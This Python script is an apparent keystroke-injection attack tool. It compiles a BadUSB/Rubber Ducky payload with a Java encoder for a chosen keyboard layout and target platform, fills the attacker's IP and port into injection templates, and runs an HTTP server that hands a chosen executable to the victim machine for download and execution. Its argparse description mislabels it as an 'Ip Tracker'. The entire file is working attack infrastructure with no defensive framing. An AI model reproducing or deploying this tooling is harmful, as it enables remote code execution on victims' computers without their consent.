import os
import sys
import ctypes
import argparse
import subprocess

from pathlib import Path
from tempfile import TemporaryDirectory

from http.server import HTTPServer, SimpleHTTPRequestHandler


keyboard_layouts = [
    'be', 'br', 'ca', 'ch', 'de',
    'dk', 'es', 'fi', 'fr', 'gb',
    'hr', 'it', 'no', 'pt', 'ru',
    'si', 'sv', 'tr', 'us'
]


class RequestHandler(SimpleHTTPRequestHandler):
    root_dir: Path = None


    def log_message(self, format: str, *args) -> None:
        get_file = args[0].split()[1]
        status_code = args[1]

        msg = '[%s] - GET Request: %s' % (status_code, get_file)

        if status_code == '200':
            event_msg(msg)
        else:
            error_msg(msg)


    def do_GET(self) -> None:
        full_path = Path(self.root_dir, self.path[1:])

        response = 200 if full_path.is_file() else 404

        self.send_response(response)
        self.end_headers()

        if response == 200:
            with open(full_path, 'rb') as file:
                self.wfile.write(file.read())


def _log_msg(symbol: str, color: str, msg: str) -> str:
    return '\033[%sm[%s]\033[0m %s' % (color, symbol, msg)


def error_msg(msg: str, exit_call: bool = False) -> None:
    print(_log_msg('!', '91', msg))
    if exit_call:
        sys.exit()


def warning_msg(msg: str) -> None:
    print(_log_msg('!', '93', msg))


def event_msg(msg: str) -> None:
    print(_log_msg('+', '94', msg))


def check_dependencies() -> None:
    dependencies = ['java']

    delimeter = ';' if sys.platform == 'win32' else ':'
    env_paths = os.environ["PATH"].split(delimeter)

    for exec_file in dependencies:
        if sys.platform == 'win32':
            exec_file += '.exe'

        if not any(map(lambda p: Path(p, exec_file).is_file(), env_paths)):
            error_msg('unable to locate: %s\n' % exec_file, True)


def valid_address(address: str) -> bool:
    if len(split_addr := address.split('.')) != 4:
        return False
    
    for num in split_addr:
        if not num.isdigit():
            return False
        if int(num) not in range(256):
            return False
    
    return True


def valid_port(port: str) -> bool:
    #if not port.isdigit():
    #    return False

    if int(port) not in range(65536):
        return False
    
    if int(port) < 1024:
        warning_msg('port %s is a well-known port which can cause errors' % port)

    return True


def generate_injection(bin_path: str, keyboard: str, input_path: str, output_path: str) -> None:
    process = subprocess.Popen(
        'java -jar %s -l %s -i %s -o %s' % (bin_path, keyboard, input_path, output_path),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True
    )

    process.wait()
    if not Path(output_path).is_file():
        error_msg('unable to generate inject.bin', True)

    event_msg('injection compiled successfully -> %s' % output_path)


def print_help() -> None: ...


#def clear() -> None: sys.stdout.write('\033[2J\033[H')


def main(abs_path: Path, args: argparse.ArgumentParser) -> None:
    check_dependencies()

    injection_dir = Path(abs_path, 'assets', 'injections')

    if args.executable is None:
        error_msg('missing executable argument', True)
    elif not args.executable.is_file():
        error_msg('unable to locate executable', True)

    if args.keyboard is None:
        error_msg('missing keyboard argument', True)
    elif args.keyboard not in keyboard_layouts:
        error_msg('invalid keyboard layout: %s' % args.keyboard, True)

    if args.target is None:
        error_msg('missing target argument', True)
    elif args.target not in os.listdir(injection_dir):
        error_msg('invalid target platform: %s' % args.target, True)

    if args.address is None:
        args.address = '0.0.0.0'
    elif not valid_address(args.address):
        error_msg('invalid address argument: %s' % args.address, True)

    if args.port is None:
        args.port = 8000
    elif not valid_port(args.port):
        error_msg('invalid port argument: %s' % args.port, True)

    if args.output is None:
        args.output = 'inject.bin'
    elif args.output.is_file():
        error_msg('file already exists %s' % args.output, True)
    else:
        try:
            args.output.touch()
        except OSError:
            error_msg('invalid output path: %s' % args.output)
    
    target_path = Path(injection_dir, args.target)

    event_msg('creating temporary directory')
    tmp_dir = TemporaryDirectory()

    http_root = Path(tmp_dir.name, 'site')
    http_root.mkdir()

    inject_file = Path(tmp_dir.name, 'inject')
    console_file = Path(http_root, 'r')

    with open(Path(target_path, 'inject') , 'r') as file:
        injection = file.read()
        for attr in ['address', 'port']:
            injection = injection.replace('{%s}' % attr, str(getattr(args, attr)))

    event_msg('creating injection file -> %s' % inject_file)
    with open(inject_file, 'w') as file:
        file.write(injection)
    
    event_msg('creating console file -> %s' % console_file)
    with open(Path(target_path, 'console')) as file:
        console = file.read()
        for attr in ['address', 'port']:
            console = console.replace('{%s}' % attr, str(getattr(args, attr)))

    with open(console_file, 'w') as file:
        file.write(console)

    os.symlink(args.executable, Path(http_root, 'exec'))

    generate_injection(Path(abs_path, 'assets/encoder/encoder.jar'),
                       args.keyboard, inject_file, args.output)

    RequestHandler.root_dir = http_root

    try:
        httpd = HTTPServer((args.address, args.port), RequestHandler)
    except OSError:
        error_msg('unable to bind listener using %s:%s' % (args.address, args.port), True)

    event_msg('running http server at %s:%s' % (args.address, args.port))
    httpd.serve_forever()


if __name__ == '__main__':
    abs_path = Path(__file__).resolve().parent

    with open(Path(abs_path, 'assets/logo.txt'), 'r', encoding='utf8') as file:
        print('\033[36m%s\033[0m' % file.read())

    if os.getuid() != 0:
        error_msg('must be run as root', True)

    parser = argparse.ArgumentParser(description='Ip Tracker')
    parser.add_argument('executable', type=Path, nargs='?', help='executable file to inject')
    parser.add_argument('-k', dest='keyboard', type=str, help='keyboard layout to use')
    parser.add_argument('-t', dest='target', type=str, help='spesify target\'s platform')
    parser.add_argument('-a', dest='address', type=str, help='ip address to use on http listener')
    parser.add_argument('-p', dest='port', type=int, help='port to use on http listener')
    parser.add_argument('-o', dest='output', type=Path, help='where to store injection output')

    args = parser.parse_args()

    try:
        main(abs_path, args)
    except KeyboardInterrupt:
        sys.stdout.write('\n')
        error_msg('keyboard interrupt')